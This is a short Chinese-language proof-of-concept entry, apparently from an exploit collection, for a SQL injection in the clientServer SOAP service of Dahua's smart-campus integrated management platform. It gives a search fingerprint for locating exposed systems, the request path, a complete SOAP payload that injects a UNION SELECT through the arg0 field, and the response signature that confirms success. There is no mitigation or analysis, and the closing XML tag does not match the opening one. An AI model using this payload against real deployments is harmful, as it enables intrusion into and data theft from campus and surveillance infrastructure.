# 大华智慧园区综合管理平台clientServerSQL注入漏洞

大华 ｜ SQL注入 ｜ —
- **指纹**：`app="dahua-智慧园区综合管理平台"`
- **请求**：`POST /portal/services/clientServer HTTP/1.1`

**Payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cli="http://clientServer.webservice.dssc.dahua.com">
<soapenv:Header/>
<soapenv:Body>
<cli:getGroupInfoListByGroupId>
<!--type: string-->
<arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,md5(1)-- -</arg0>
<!--type: long-->
<arg1>10</arg1>
</cli:getGroupInfoListByGroupId>
</soapenv:Body>
</soap:Envelope>
```
- **响应特征**：200 b923820dcc